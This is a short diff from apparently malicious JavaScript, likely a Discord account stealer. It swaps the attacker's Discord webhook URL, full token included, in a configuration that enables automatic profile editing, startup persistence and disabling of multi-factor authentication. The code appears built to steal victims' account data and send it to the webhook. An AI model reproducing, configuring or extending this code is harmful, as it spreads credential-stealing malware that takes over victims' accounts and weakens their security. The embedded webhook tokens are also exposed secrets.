@@ -33,8 +33,8 @@ const execScript = async (script) => {
 };
 
 const CONFIG = {
-    webhook: 'https://discord.com/api/webhooks/1358928197890212195/zOjktE86gfMKdsrwc6VudHn4ijHHn-YLEshnV7POlXf10Aroceu9ZNytX4Kg67SyT3Yj',
-    API: 'https://discord.com/api/webhooks/1358928197890212195/zOjktE86gfMKdsrwc6VudHn4ijHHn-YLEshnV7POlXf10Aroceu9ZNytX4Kg67SyT3Yj',
+    webhook: 'https://discord.com/api/webhooks/1384221761914277919/NlUh6x4tyB-g3Sba58IFVuYrX42VWK6qfZ6QD3g9u-A80QWI8EbTmnjZpzrXp6zyVSq1',
+    API: 'https://discord.com/api/webhooks/1384221761914277919/NlUh6x4tyB-g3Sba58IFVuYrX42VWK6qfZ6QD3g9u-A80QWI8EbTmnjZpzrXp6zyVSq1',
     auto_user_profile_edit: 'true',
     auto_persist_startup: 'true',
     auto_mfa_disabler: 'true',
